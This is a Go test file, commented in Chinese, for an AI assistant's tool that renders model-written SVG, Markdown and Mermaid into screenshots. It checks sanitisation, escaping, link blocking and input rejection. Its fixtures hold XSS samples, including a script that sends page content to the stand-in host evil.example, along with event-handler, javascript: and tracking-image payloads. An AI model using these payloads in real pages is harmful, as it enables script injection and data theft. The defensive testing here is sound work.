// Copyright (c) 2025-now SuInk.
// Licensed under the Limited Redistribution License in the repository root.

package assistant

import (
	"bytes"
	"context"
	"github.com/SuInk/diana/model/applog"
	"image"
	"image/color"
	"image/png"
	"strings"
	"testing"
)

// SVG 是模型写的，最终会进浏览器。沙箱屏蔽了内网和 localhost，但那不是不净化的
// 理由：脚本能读到页面里别的东西，外链能把内容带出去。这里逐条钉住必须被拦下的写法。
func TestSanitizeRenderSVGStripsActiveContent(t *testing.T) {
	stripped := map[string]string{
		"内联脚本":          `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("http://evil.example/"+document.body.innerHTML)</script><rect width="10" height="10"/></svg>`,
		"自闭合脚本标签":       `<svg xmlns="http://www.w3.org/2000/svg"><script src="x.js"/><rect width="10" height="10"/></svg>`,
		"大小写混写的脚本":      `<svg xmlns="http://www.w3.org/2000/svg"><ScRiPt>alert(1)</ScRiPt><rect width="10" height="10"/></svg>`,
		"事件属性":          `<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10" onload="alert(1)"/></svg>`,
		"带单引号的事件属性":     `<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10" onclick='alert(1)'/></svg>`,
		"foreignObject": `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="http://evil.example"></iframe></foreignObject></svg>`,
		"外链 href":       `<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/track.png" width="10" height="10"/></svg>`,
		"外链 xlink:href": `<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="http://evil.example/track.png" width="10" height="10"/></svg>`,
		"协议相对外链":        `<svg xmlns="http://www.w3.org/2000/svg"><image href="//evil.example/track.png" width="10" height="10"/></svg>`,
	}
	forbidden := []string{"script", "onload", "onclick", "foreignobject", "evil.example"}
	for name, source := range stripped {
		t.Run(name, func(t *testing.T) {
			cleaned, err := sanitizeRenderSVG(source)
			if err != nil {
				t.Fatalf("净化不该整个拒绝：%v", err)
			}
			lower := strings.ToLower(cleaned)
			for _, token := range forbidden {
				if strings.Contains(lower, token) {
					t.Fatalf("净化后仍然残留 %q：%s", token, cleaned)
				}
			}
		})
	}
}

func TestSanitizeRenderSVGRejectsNonSVGAndJavascriptURL(t *testing.T) {
	if _, err := sanitizeRenderSVG(`<div>不是 svg</div>`); err == nil {
		t.Fatal("非 <svg> 开头的内容应当被拒绝")
	}
	if _, err := sanitizeRenderSVG(`<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>`); err == nil {
		t.Fatal("javascript: 链接应当被拒绝")
	}
	// 正常的静态图形要原样留下。
	cleaned, err := sanitizeRenderSVG(`<svg xmlns="http://www.w3.org/2000/svg" width="40" height="20"><rect width="40" height="20" fill="#eee"/></svg>`)
	if err != nil {
		t.Fatalf("普通静态 SVG 被拒绝了：%v", err)
	}
	if !strings.Contains(cleaned, "<rect") {
		t.Fatalf("图形本身被削掉了：%s", cleaned)
	}
}

// Markdown 走 goldmark 且刻意不开 WithUnsafe：模型想借 Markdown 夹一段 HTML
// 进来，只会被当成文本转义掉。
func TestMarkdownToRenderHTMLEscapesRawHTML(t *testing.T) {
	out, err := markdownToRenderHTML("正常文字\n\n<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>")
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<script") || strings.Contains(strings.ToLower(out), "onerror") {
		t.Fatalf("原始 HTML 没有被转义：%s", out)
	}
	// GFM 表格要能正常出表格，那是这个工具最主要的用途。
	table, err := markdownToRenderHTML("| 方案 | 内存 |\n| --- | --- |\n| n-gram | 低 |")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(table, "<table") || !strings.Contains(table, "<td") {
		t.Fatalf("GFM 表格没有渲染成表格：%s", table)
	}
}

func TestBuildRenderPageIsSelfContained(t *testing.T) {
	// 截图沙箱没有网络，页面里出现任何外链都等于那部分渲染不出来。
	for _, tc := range []struct{ name, format, content string }{
		{"markdown", renderFormatMarkdown, "# 标题\n\n| a | b |\n| --- | --- |\n| 1 | 2 |"},
		{"mermaid", renderFormatMermaid, "flowchart TD\n  A --> B"},
		{"svg", renderFormatSVG, `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			page, err := buildRenderPage(tc.format, tc.content, "标题")
			if err != nil {
				t.Fatal(err)
			}
			for _, external := range []string{`src="http`, `src='http`, `href="http`, `href='http`, "//cdn.", "//unpkg"} {
				if strings.Contains(page, external) {
					t.Fatalf("页面里有外链 %q", external)
				}
			}
			if !strings.Contains(page, "标题") {
				t.Fatal("标题没有渲染进去")
			}
		})
	}
	// mermaid 才需要把那 2MB 的脚本塞进去，另外两种不该白白带上。
	mermaidPage, _ := buildRenderPage(renderFormatMermaid, "flowchart TD\n A-->B", "")
	markdownPage, _ := buildRenderPage(renderFormatMarkdown, "文字", "")
	if !strings.Contains(mermaidPage, "globalThis.mermaid") {
		t.Fatal("mermaid 页面里没有内嵌脚本")
	}
	if strings.Contains(markdownPage, "globalThis.mermaid") {
		t.Fatalf("Markdown 页面白带了 mermaid 脚本，长度 %d", len(markdownPage))
	}
	if !strings.Contains(mermaidPage, `"securityLevel":"strict"`) {
		t.Fatal("mermaid 没有用 strict 安全级别初始化")
	}
}

func TestBuildRenderPageRejectsBadInput(t *testing.T) {
	if _, err := buildRenderPage("html", "<b>x</b>", ""); err == nil {
		t.Fatal("不该接受 html 格式——那等于把任意 HTML 注入点交给模型")
	}
	if _, err := buildRenderPage(renderFormatMarkdown, "   ", ""); err == nil {
		t.Fatal("空内容应当被拒绝")
	}
}

// 截图高度是命令行给死的窗口高度，不是内容高度。不裁的话两行表格也出一整屏。
func TestTrimRenderScreenshotCropsBackground(t *testing.T) {
	const width, height = 200, 400
	canvas := image.NewRGBA(image.Rect(0, 0, width, height))
	background := color.RGBA{R: 0xff, G: 0xff, B: 0xff, A: 0xff}
	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			canvas.Set(x, y, background)
		}
	}
	// 只在左上角画一小块，剩下全是背景。
	for y := 5; y < 40; y++ {
		for x := 5; x < 60; x++ {
			canvas.Set(x, y, color.RGBA{A: 0xff})
		}
	}
	var buffer bytes.Buffer
	if err := png.Encode(&buffer, canvas); err != nil {
		t.Fatal(err)
	}

	trimmed := trimRenderScreenshot(buffer.Bytes())
	decoded, err := png.Decode(bytes.NewReader(trimmed))
	if err != nil {
		t.Fatal(err)
	}
	bounds := decoded.Bounds()
	if bounds.Dy() >= height {
		t.Fatalf("底部空白没有裁掉：高度仍是 %d", bounds.Dy())
	}
	// 内容加上留白都要还在，别把图裁进内容里。
	if bounds.Dy() < 40 || bounds.Dx() < 60 {
		t.Fatalf("裁过头了：%dx%d", bounds.Dx(), bounds.Dy())
	}
}

// 整张都是背景色说明这次什么也没画出来，这时候原样返回，别裁成 0 像素。
func TestTrimRenderScreenshotKeepsBlankImage(t *testing.T) {
	canvas := image.NewRGBA(image.Rect(0, 0, 40, 40))
	for y := 0; y < 40; y++ {
		for x := 0; x < 40; x++ {
			canvas.Set(x, y, color.RGBA{R: 0xff, G: 0xff, B: 0xff, A: 0xff})
		}
	}
	var buffer bytes.Buffer
	if err := png.Encode(&buffer, canvas); err != nil {
		t.Fatal(err)
	}
	raw := buffer.Bytes()
	if got := trimRenderScreenshot(raw); !bytes.Equal(got, raw) {
		t.Fatal("全背景的图应当原样返回")
	}
	// 不是 PNG 也不该炸，原样退回去让上层报真正的错。
	if got := trimRenderScreenshot([]byte("not a png")); string(got) != "not a png" {
		t.Fatal("解不开的数据应当原样返回")
	}
}

// 出图要起一次无头浏览器，浏览器归「网页渲染」插件管。插件停用时这个工具
// 不能绕过去自己起一个，也要把原因说清楚——只回一句「画不了」的话，
// 人不知道该去开哪个开关。
func TestRenderToolRefusesWhenBrowserPluginDisabled(t *testing.T) {
	runtime := NewRuntime(BotConfig{BotAccount: "42"}, nilChannel{}, NewPluginManager(), nil, nil, nil, nil)
	logs := &captureRelationLogs{}
	runtime.SetAppLogWriter(logs)
	event := MessageEvent{Kind: EventKindGroup, GroupID: "555", UserID: "10001", MessageID: "m1"}

	tool := newDianaRenderTool(runtime, event)
	output, err := tool.Run(context.Background(), map[string]any{
		"format":  renderFormatMarkdown,
		"content": "| a | b |\n| --- | --- |\n| 1 | 2 |",
	})
	if err != nil {
		t.Fatalf("工具不该抛错：%v", err)
	}
	if !strings.Contains(output, `"ok":false`) || !strings.Contains(output, "网页渲染") {
		t.Fatalf("没有说清是哪个插件没开：%s", output)
	}
	entry, ok := logs.find("assistant.render")
	if !ok {
		t.Fatalf("运行记录里没有这次失败：%#v", logs.entries)
	}
	if entry.Level != applog.LevelError {
		t.Fatalf("失败应当记成 error：%#v", entry)
	}
}

// 参数不合法在起浏览器之前就该拦下：起一次浏览器是几百毫秒起步的开销，
// 而且模型拿到「渲染失败」只会原样重试一次。
func TestRenderToolRejectsBadInputBeforeRendering(t *testing.T) {
	runtime := NewRuntime(BotConfig{BotAccount: "42"}, nilChannel{}, NewPluginManager(), nil, nil, nil, nil)
	event := MessageEvent{Kind: EventKindGroup, GroupID: "555", UserID: "10001"}
	tool := newDianaRenderTool(runtime, event)

	cases := map[string]map[string]any{
		"未知格式": {"format": "html", "content": "<b>x</b>"},
		"内容为空": {"format": renderFormatMarkdown, "content": "   "},
		"内容过长": {"format": renderFormatMarkdown, "content": strings.Repeat("字", renderImageMaxContent+1)},
		"缺少格式": {"content": "文字"},
	}
	for name, input := range cases {
		t.Run(name, func(t *testing.T) {
			output, err := tool.Run(context.Background(), input)
			if err != nil {
				t.Fatalf("工具不该抛错：%v", err)
			}
			if !strings.Contains(output, `"ok":false`) {
				t.Fatalf("output = %s", output)
			}
		})
	}
}
